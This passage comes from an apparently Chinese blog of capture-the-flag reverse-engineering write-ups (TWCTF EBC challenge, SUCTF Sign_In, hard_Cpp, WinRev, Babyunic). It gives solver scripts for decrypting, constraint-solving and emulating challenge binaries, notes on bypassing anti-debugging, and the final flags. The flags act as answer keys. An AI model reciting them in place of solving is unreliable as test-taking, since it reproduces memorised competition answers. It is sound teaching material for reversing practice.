<p>(<a href="https://github.com/yabits/ebcvm)有一个调试工具，但是这里使用有问题，而且功能很少" target="_blank" rel="noopener">https://github.com/yabits/ebcvm)有一个调试工具，但是这里使用有问题，而且功能很少</a><br>那就只能静态分析了<br>可以发现有很多以<code>db 0x83</code>开头，无法解析的指令，这些都是call指令，且应该是syscall，因此它的call的地址不太对劲，导致失败<br>但是根据参数也能猜出它在干啥<br>然后后面就是程序的逻辑了<br>大概就是动态解密了4次代码，check四次，每次8字节，但是可以发现的是每次的xor key 应该都不一样，猜测是因为<code>CALL32EXa   [R3+0x158]</code>,这个函数传入了flag , 8 , xor key 作为参数，所以应该是根据flag对xor key进行了处理，但是这里找不到这个函数的位置，因此无法直接逆。<br>但是可以发现的是，这里的函数调用的开头指令都是取传入的参数，因此可以认为这些解密后函数开头4字节都是一样的，通过这一特性就能得到每次的xor key是啥<br>解密4次check的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#这些数组，太长了，就不贴上去了 </span><br><span class="line">for i in range(704/4):</span><br><span class="line">    r1 = unk_402114[i];#dword</span><br><span class="line">    key = 114514893#dword;</span><br><span class="line">    r1 ^= key#32</span><br><span class="line">    r3[i] = r1;</span><br><span class="line">    idc.PatchDword(0x401354+i*4,r1);</span><br><span class="line"></span><br><span class="line">for i in range(0,1888,4):</span><br><span class="line">    r1 = unk_4023DC[i/4];#dword</span><br><span class="line">    key = 1128602469#dword;</span><br><span class="line">    r1 ^= key#32</span><br><span class="line">    # r3[i] = r1;</span><br><span class="line">    idc.PatchDword(0x401354+i,r1);</span><br><span class="line">print &apos;done&apos;</span><br><span class="line"></span><br><span class="line">for i in range(0,0x830,4):</span><br><span class="line">    r1 = unk_402B44[i/4];#dword</span><br><span class="line">    key = unk_402B44[0]^ 0x10028160#dword;</span><br><span class="line">    r1 ^= key#32</span><br><span class="line">    # r3[i] = r1;</span><br><span class="line">    idc.PatchDword(0x401354+i,r1);</span><br><span class="line">print &apos;done&apos;</span><br><span class="line"></span><br><span class="line">for i in range(0,0x930,4):</span><br><span class="line">    r1 = unk_40337C[i/4];#dword</span><br><span class="line">    key = unk_40337C[0]^ 0x10028160#dword;</span><br><span class="line">    r1 ^= key#32</span><br><span class="line">    # r3[i] = r1;</span><br><span class="line">    idc.PatchDword(0x401354+i,r1);</span><br><span class="line">print &apos;done&apos;</span><br></pre></td></tr></table></figure></p>
<p>分析可以发现，这些check都是在验证算术表达式，因此用z3解决这个问题，首先清理一下它的指令（每一个check都要修改结束地址）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">func = &#123;</span><br><span class="line">    0xF7: &apos;mov&apos;,</span><br><span class="line">    0x4d: &apos;sub&apos;,</span><br><span class="line">    0x56: &apos;xor&apos;,</span><br><span class="line">    0x4c: &apos;add&apos;,</span><br><span class="line">    0x4a: &apos;not&apos;,</span><br><span class="line">    0x4B: &apos;neg&apos;,</span><br><span class="line">    0x55: &apos;or&apos;,</span><br><span class="line">    0x57: &apos;shl&apos;,</span><br><span class="line">    0x58: &apos;shr&apos;,</span><br><span class="line">    0x20: &apos;mov1&apos;,</span><br><span class="line">    0x77: &apos;mov2&apos;,</span><br><span class="line">    0x53: &apos;and&apos;,</span><br><span class="line">    0x4F: &apos;mul&apos;,</span><br><span class="line">    0x45: &apos;cmp&apos;,</span><br><span class="line">    0x82: &apos;jmp&apos;,</span><br><span class="line">    0xb7: &apos;mov3&apos;,</span><br><span class="line">    0x60: &apos;mov4&apos;,</span><br><span class="line">    0x54: &apos;and&apos;,</span><br><span class="line">&#125;</span><br><span class="line">ea = 0x401358;</span><br><span class="line">a = []</span><br><span class="line">while ea!=0x401B66:</span><br><span class="line">    print hex(ea),hex(idc.Byte(ea));</span><br><span class="line">    op = func[ idc.Byte(ea) ];</span><br><span class="line">    #</span><br><span class="line">    if op==&apos;jmp&apos;:</span><br><span class="line">        ea = idc.NextHead(ea);</span><br><span class="line">        continue;</span><br><span class="line">    if op==&apos;mov3&apos;:</span><br><span class="line">        a.append( (op,idc.GetOpnd(ea,0),hex(idc.Dword(ea+2))) );</span><br><span class="line">    elif op==&apos;mov&apos;:</span><br><span class="line">        a.append( (op,idc.GetOpnd(ea,0),hex(idc.Qword(ea+2))) );</span><br><span class="line">    else:</span><br><span class="line">    # print (op,str(idc.GetOpnd(ea,0)),str(idc.GetOpnd(ea,1) ))</span><br><span class="line">        a.append( (op,idc.GetOpnd(ea,0),str(idc.GetOpnd(ea,1))) );</span><br><span class="line">    ea = idc.NextHead(ea);</span><br><span class="line">print a;</span><br><span class="line">print &apos;done&apos;</span><br></pre></td></tr></table></figure>
<p>然后模拟一下这些指令，得到z3约束，然后求解</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">print &apos;start&apos;</span><br><span class="line">ans = Solver();</span><br><span class="line">x = BitVec(&quot;x&quot;,64);</span><br><span class="line">r1 = x;</span><br><span class="line">x2 = BitVec(&quot;x2&quot;,64);</span><br><span class="line">r2 = 0;</span><br><span class="line">r3 = 0;</span><br><span class="line">r4 = 0;</span><br><span class="line">r5 = 0;</span><br><span class="line">r6 = 0;</span><br><span class="line">r7 = 0;</span><br><span class="line">r8 = 0;</span><br><span class="line"># global val;</span><br><span class="line">val = &#123;</span><br><span class="line">    &apos;R1&apos;:r1,</span><br><span class="line">    &apos;R2&apos;:r2,</span><br><span class="line">    &apos;R3&apos;:r3,</span><br><span class="line">    &apos;R4&apos;:r4,</span><br><span class="line">    &apos;R5&apos;:r5,</span><br><span class="line">    &apos;R6&apos;:r6,</span><br><span class="line">    &apos;R7&apos;:r7,</span><br><span class="line">    &apos;R8&apos;:r8,</span><br><span class="line">&#125;</span><br><span class="line">val[&apos;R1&apos;]=x;</span><br><span class="line">for i in p:</span><br><span class="line">    op,c1,c2 = i;</span><br><span class="line">    if c2[-1]==&apos;L&apos;:</span><br><span class="line">        c2=c2[:-1];</span><br><span class="line">    if op==&apos;mov&apos;:</span><br><span class="line">        val[c1]=int(c2,16);</span><br><span class="line">    elif op==&apos;sub&apos;:</span><br><span class="line">        val[c1]=val[c1]-val[c2];</span><br><span class="line">    elif op==&apos;xor&apos;:</span><br><span class="line">        val[c1]=val[c1]^val[c2];</span><br><span class="line">    elif op==&apos;add&apos;:</span><br><span class="line">        val[c1]=(val[c1]+val[c2])</span><br><span class="line">    elif op==&apos;not&apos;:</span><br><span class="line">        val[c1]=~val[c1];</span><br><span class="line">    elif op==&apos;mov1&apos;:</span><br><span class="line">        val[c1]=val[c2];</span><br><span class="line">    elif op==&apos;mov2&apos;:</span><br><span class="line">        # print c2;</span><br><span class="line">        val[c1]=int(c2,16);</span><br><span class="line">    elif op==&apos;shl&apos;:</span><br><span class="line">        val[c1]=((val[c1]&lt;&lt;val[c2]))</span><br><span class="line">    elif op==&apos;shr&apos;:</span><br><span class="line">        val[c1]=LShR(val[c1],val[c2])</span><br><span class="line">    elif op==&apos;or&apos;:</span><br><span class="line">        val[c1]=val[c1] | val[c2];    </span><br><span class="line">    elif op==&apos;neg&apos;:</span><br><span class="line">        val[c1]=~val[c1]+1;</span><br><span class="line">    elif op==&apos;cmp&apos;:</span><br><span class="line">        ans.add(val[&apos;R1&apos;]==val[&apos;R7&apos;]);</span><br><span class="line">    elif op==&apos;mul&apos;:</span><br><span class="line">        val[c1]=(val[c1] * val[c2]);</span><br><span class="line">    elif op==&apos;and&apos;:</span><br><span class="line">        val[c1]=val[c1] &amp; val[c2];</span><br><span class="line">    elif op==&apos;mov3&apos;:</span><br><span class="line">        val[c1]=int(c2,16);</span><br><span class="line">    elif op==&apos;mov4&apos;:</span><br><span class="line">        val[&apos;R1&apos;]=x2;  </span><br><span class="line">        print val[&apos;R1&apos;];</span><br><span class="line">    else:</span><br><span class="line">        print &apos;!!!!!!!!!!!!!!!&apos;</span><br><span class="line"># print r1;</span><br><span class="line"># print (val[&apos;R1&apos;])</span><br><span class="line">ans.add(val[&apos;R1&apos;]==val[&apos;R7&apos;]);</span><br><span class="line"></span><br><span class="line">for i in range(0,64,8):</span><br><span class="line">    # print (x&gt;&gt;i)&amp;0xff&gt;=32</span><br><span class="line">    ans.add((x&gt;&gt;i)&amp;0xff&gt;=32);</span><br><span class="line">    ans.add((x&gt;&gt;i)&amp;0xff&lt;=122);</span><br><span class="line">    ans.add((x&gt;&gt;i)&amp;0xff!=0xf6);</span><br><span class="line">    ans.add((x&gt;&gt;i)&amp;0xff!=ord(&apos;`&apos;))</span><br><span class="line"></span><br><span class="line">import mytools</span><br><span class="line"></span><br><span class="line">while ans.check()==sat:</span><br><span class="line">    m = ans.model();</span><br><span class="line"></span><br><span class="line">    a= mytools.p(m[x].as_long().real);</span><br><span class="line">    b= mytools.p(m[x2].as_long().real);</span><br><span class="line">    print a.encode(&apos;hex&apos;),a,b</span><br><span class="line">    ans.add( m[x]!=x );</span><br></pre></td></tr></table></figure>
<p>前三个check都能以这种方式得到答案，但是第4个check存在多解，且第4个check传递了flag 和 xor key作为参数，并同时check了xor key，猜测可能是要根据xor key 来约束多解，但是由于不知道之前那个函数的具体内容，因此只好先打印出所有包含字母数字的解，然后通过语义猜出了flag。。。</p>
<p>TWCTF{EBC_1n7erpret3r_1s_m4d3_opt10n4l}</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-SUCTF-Reverse-wp" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/08/19/SUCTF-Reverse-wp/" class="article-date">
      <time datetime="2019-08-19T02:40:18.000Z" itemprop="datePublished">2019-08-19</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/19/SUCTF-Reverse-wp/">SUCTF Re wp</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="Sign-In"><a href="#Sign-In" class="headerlink" title="Sign_In"></a>Sign_In</h1><p>简单RSA，分解n即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">c = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span><br><span class="line">p = 282164587459512124844245113950593348271</span><br><span class="line">q = 366669102002966856876605669837014229419</span><br><span class="line">n = p * q;</span><br><span class="line">e = 65537</span><br><span class="line">phin = (p - 1) * (q - 1)</span><br><span class="line">d = gmpy2.invert(e, phin) </span><br><span class="line">m = gmpy2.powmod(c,d,n)</span><br><span class="line">print hex(m);</span><br><span class="line">print hex(m)[2:].decode(&apos;hex&apos;);</span><br></pre></td></tr></table></figure></p>
<h1 id="hard-Cpp"><a href="#hard-Cpp" class="headerlink" title="hard_Cpp"></a>hard_Cpp</h1><p>被混淆过的程序，调试一下，还是很容易看懂<br>首先检查了读入的时间，超过一秒直接退出<br>对每两个字节加密，然后校验，dfs一下就出来了，一定要记得数字大小超限时要&amp;0xff截断，被这个还坑了挺久</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">s = [ 0 ]*22; </span><br><span class="line">enc = [243L, 46L, 24L, 54L, 225L, 76L, 34L, 209L, 249L, 140L, 64L, 118L, 244L, 14L, 0L, 5L, 163L, 144L, 14L, 165L]</span><br><span class="line"></span><br><span class="line">def func(i,j):</span><br><span class="line"></span><br><span class="line">    v34 = s[i]^j</span><br><span class="line">    v33 = s[j-1+i];</span><br><span class="line">    v11 = v33%7</span><br><span class="line">    v35 = v11+v34;</span><br><span class="line"></span><br><span class="line">    v32  = v35;</span><br><span class="line">    v31 = s[j-1+i];</span><br><span class="line">    v12 = v31^18;</span><br><span class="line">    v30 = v12;</span><br><span class="line">    v13 = v30*3</span><br><span class="line"></span><br><span class="line">    v29 = v13;</span><br><span class="line">    v14 = v29 + 2;</span><br><span class="line">    v15 = v32 ^ v14;</span><br><span class="line"></span><br><span class="line">    return v15&amp;0xff;</span><br><span class="line"></span><br><span class="line">def dfs(i,j):</span><br><span class="line"></span><br><span class="line">    if i==len(enc)+1:</span><br><span class="line">        print &apos;get---&gt;&apos;</span><br><span class="line">        print i,&apos;&apos;.join( [  chr(j) for j in s ] );</span><br><span class="line">        return ;</span><br><span class="line"></span><br><span class="line">    if i == 1:</span><br><span class="line">        for _ in range(32,127):</span><br><span class="line">            for __ in range(32,127):</span><br><span class="line"></span><br><span class="line">                s[i]=_;</span><br><span class="line">                s[j-1+i]=__;</span><br><span class="line">                if func(i,j)==enc[i-1]:</span><br><span class="line">                    dfs(i+1,j);</span><br><span class="line">    else:</span><br><span class="line">        for _ in range(32,127):</span><br><span class="line">            s[i]=_;       </span><br><span class="line">            if func(i,j)==enc[i-1]:        </span><br><span class="line">                dfs(i+1,j);</span><br><span class="line"></span><br><span class="line">dfs(1,0);</span><br></pre></td></tr></table></figure>
<p>flag{mY-CurR1ed_Fns}</p>
<h1 id="WinRev"><a href="#WinRev" class="headerlink" title="WinRev"></a>WinRev</h1><p>首先调试发现，“Stop debugging program!”，遂patch掉，与此同时发现程序解密了不少字符串，一部分是和反调试相关<br>然后进入Main，开头的函数CreateEventW初始化了三个事件，然后还有一些不知道在干啥的操作<br>main函数中开启了一个线程<br>该线程的作用</p>
<ul>
<li>获取进程名，计算其md5值，用于寻找是否有调试器进程存在，通过后然后解密了一段代码后setEventW</li>
<li>简单的反调试了一下</li>
<li>等待多个事件的发生<br>main函数的第一个check很简单，通过后会再一次解密一段代码，然后setEventW<br>第二个check为打开文件WinRev.exe:signature，计算其MD5值并校验，理论上不可逆，遂不管它，同时这个文件名也是非法的，把 ‘:’ 改成正常的字母就好，通过校验后第三次解密一段代码，setEventW<br>三个事件同时满足后，分配一段内存空间，并将解密后的代码(dll)载入，然后开辟一段共享内存空间，并写入一段数据。然后再dll中进行最后一次check，要求输入flag，但奇怪的地方是该dll调用库函数puts时会直接出错，导致我无法调试，因此把该dll dump出来，静态分析一下，发现程序向共享数据块请求了一段数据，然后传入Ak1i3aS3cre7K3\x00y进行AES加密，与flag做比较，遂解之、<br>相关脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import hashlib;</span><br><span class="line"></span><br><span class="line">def get_key1():</span><br><span class="line">    ret = [0]*18;</span><br><span class="line">    a = [47L, 31L, 32L, 46L, 52L, 4L, 55L, 45L, 16L, 57L, 124L, 34L, 123L, 117L, 10L, 56L, 57L, 33L]</span><br><span class="line">    v5 = [1,5,4,2,3,0];</span><br><span class="line">    for i in range(18):</span><br><span class="line">        ret[  6*(i/6)+v5[i%6] ] = a[i] ^ (6*(i/6)+v5[i%6]) ^0x45;</span><br><span class="line">    return &apos;&apos;.join( [  chr(i) for i in ret ]);</span><br><span class="line">print &apos;key1:&apos;,get_key1();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = [</span><br><span class="line">0x94,</span><br><span class="line">0xBF,</span><br><span class="line">0x7A,</span><br><span class="line">0xC,</span><br><span class="line">0xA4,</span><br><span class="line">0x35,</span><br><span class="line">0x50,</span><br><span class="line">0xD1,</span><br><span class="line">0xC2,</span><br><span class="line">0x15,</span><br><span class="line">0xEC,</span><br><span class="line">0xEF,</span><br><span class="line">0x9D,</span><br><span class="line">0x9A,</span><br><span class="line">0xAA,</span><br><span class="line">0x56]</span><br><span class="line">from  Crypto.Cipher import AES</span><br><span class="line">def aes_decrypt(cipher,key,iv=None):</span><br><span class="line">    k = AES.new(key,AES.MODE_ECB);</span><br><span class="line">    # k = AES.new(key,AES.MODE_CBC,iv);</span><br><span class="line">    plain = k.decrypt(cipher);</span><br><span class="line">    return plain;</span><br><span class="line">a = &apos;&apos;.join( [ chr(i) for i in a ] );</span><br><span class="line">print aes_decrypt(a,&quot;Ak1i3aS3cre7K3y\x00&quot;)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>flag{Ak1rAWin!}</p>
<h1 id="Babyunic"><a href="#Babyunic" class="headerlink" title="Babyunic"></a>Babyunic</h1><p>程序以MIPS 大端模式载入了一段数据，并用unicorn模拟执行<br>所以分析的重点在于该MIPS代码，由于不知道怎么反编译，所以只能对着汇编看<br>程序逻辑为</p>
<ul>
<li>计算输入长度</li>
<li>对每一位进行了简单的加密 <code>((flag[i]&lt;&lt;3)&amp;0xff) | ((flag[i]&gt;&gt;5)&amp;0xff)</code></li>
<li>然后就是若干个方程组<br>所以，写个脚本清洗一下这些方程组，但需要注意的是这里是大端模式，所以最后待比较的密文不需要逆序<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">from unicorn import *</span><br><span class="line">from unicorn.mips_const import *</span><br><span class="line">from capstone import *</span><br><span class="line">from z3 import *;</span><br><span class="line">mu = Uc(UC_ARCH_MIPS,UC_MODE_MIPS32|UC_MODE_BIG_ENDIAN);</span><br><span class="line">base = 0x400000;</span><br><span class="line">base_size = 1024*1024;</span><br><span class="line">stack_addr = 0;</span><br><span class="line">stack_size = 1024*1024;</span><br><span class="line">file = open(&apos;func&apos;,&apos;rb+&apos;);</span><br><span class="line">CODE = &quot;&quot;;</span><br><span class="line">flag = &quot;a&quot;*42;</span><br><span class="line"># flag = [ BitVec(&apos;x%d&apos;%i,8)for i in range(16) ]</span><br><span class="line">while  True:</span><br><span class="line">    t=file.read();</span><br><span class="line">    if t==&quot;&quot;:</span><br><span class="line">        break</span><br><span class="line">    CODE+=t;</span><br><span class="line">mu.mem_map(base,0x200000);</span><br><span class="line">mu.mem_map(0x10000000,0x200000);</span><br><span class="line">mu.mem_write(base,CODE);</span><br><span class="line">mu.mem_write(0x101FFB00,flag);</span><br><span class="line">mu.reg_write(UC_MIPS_REG_SP,0x101FFFC0);</span><br><span class="line">mu.reg_write(UC_MIPS_REG_FP,0x101FFFC0);</span><br><span class="line">mu.reg_write(UC_MIPS_REG_A1,0x101FFA00);</span><br><span class="line">mu.reg_write(UC_MIPS_REG_A0,0x101FFB00);</span><br><span class="line">md = Cs(CS_ARCH_MIPS, CS_MODE_MIPS32 + CS_MODE_BIG_ENDIAN)</span><br><span class="line">map = &#123;&#125;;</span><br><span class="line">idx=0;</span><br><span class="line">st = &quot;&quot;</span><br><span class="line">count=0;</span><br><span class="line">def hook_code(mu,addr,size,user_data):</span><br><span class="line">    global idx</span><br><span class="line">    global st;</span><br><span class="line">    global count;</span><br><span class="line">    # ins_count+=1;</span><br><span class="line">    # print &apos;0x%x&apos;%(addr);</span><br><span class="line">    if addr&lt;0x004000CC:</span><br><span class="line">        return;</span><br><span class="line">    for i in md.disasm( str(mu.mem_read(addr,4)) , addr):</span><br><span class="line">        # print &apos;0x%x: %s %-6s %s&apos; % (i.address, str(i.bytes).encode(&apos;hex&apos;), i.mnemonic, i.op_str)</span><br><span class="line">        if addr&lt;0x00400374 and str(i.mnemonic)==&apos;lbu&apos; and  ( &quot;$v1, ($v1)&quot; in str(i.op_str) or &quot;$v0, ($v0)&quot; in str(i.op_str) ):</span><br><span class="line">            </span><br><span class="line">            if &quot;$v0, ($v0)&quot; in str(i.op_str) :</span><br><span class="line">                idx = mu.reg_read(UC_MIPS_REG_V0)-0x101FFB00;</span><br><span class="line">            else:</span><br><span class="line">                idx = mu.reg_read(UC_MIPS_REG_V1)-0x101FFB00;</span><br><span class="line">            # print hex(idx);</span><br><span class="line">            # map[ str(i.mnemonic) ]=1;</span><br><span class="line">            # print &apos;haha&apos;</span><br><span class="line">            # idx = </span><br><span class="line">            for j in md.disasm( str(mu.mem_read(addr+4,4)) , addr+4):</span><br><span class="line">                if j.mnemonic==&apos;addu&apos;:</span><br><span class="line">                    st=st+&quot;,+1&quot;;</span><br><span class="line">                elif j.mnemonic==&apos;move&apos;:</span><br><span class="line">                    # print st;</span><br><span class="line">                    st=&quot;1&quot;;</span><br><span class="line">                elif j.mnemonic==&apos;subu&apos;:</span><br><span class="line">                    st=st+&quot;,-1&quot;;</span><br><span class="line">        elif addr&gt;=0x00400374 and str(i.mnemonic)==&apos;lbu&apos; and   (&quot;$v1, ($v1)&quot; in str(i.op_str) or &quot;$a0, ($a0)&quot; in str(i.op_str)) :</span><br><span class="line">            if &quot;$a0, ($a0)&quot; in str(i.op_str) :</span><br><span class="line">                idx = mu.reg_read(UC_MIPS_REG_A0)-0x101FFB00;</span><br><span class="line">            else:</span><br><span class="line">                idx = mu.reg_read(UC_MIPS_REG_V1)-0x101FFB00;</span><br><span class="line">            for j in md.disasm( str(mu.mem_read(addr+4,4)) , addr+4):</span><br><span class="line">                if j.mnemonic==&apos;addu&apos;:</span><br><span class="line">                    st=st+&quot;,1&quot;;</span><br><span class="line">                elif j.mnemonic==&apos;move&apos;:</span><br><span class="line">                    # st=&quot;&quot;</span><br><span class="line">                    print st+&apos;]&apos;;</span><br><span class="line">                    count+=1;</span><br><span class="line">                    st=&quot;[1&quot;;</span><br><span class="line">                elif j.mnemonic==&apos;subu&apos;:</span><br><span class="line">                    st=st+&quot;,-1&quot;;</span><br><span class="line">mu.hook_add(UC_HOOK_CODE,hook_code);</span><br><span class="line"># print &apos;[+] Start&apos;</span><br><span class="line">mu.emu_start(0x400000,0x40706C);</span><br><span class="line"># print len( str(mu.mem_read(0x101FFA00,200)).encode(&apos;hex&apos;) );</span><br><span class="line">print st+&apos;]&apos;</span><br><span class="line">print str(mu.mem_read(0x101FFA00,200))[164:168]</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>得到方程组的参数后矩阵乘一下得到答案</p>
<p>[154,171,24,161,54,222,172,116,129,18,139,152,127,247,36,124,43,90,97,138,238,95,141,237,26,227,152,154,167,54,141,166,139,66,216,129,94,164,69,188,33,194]</p>
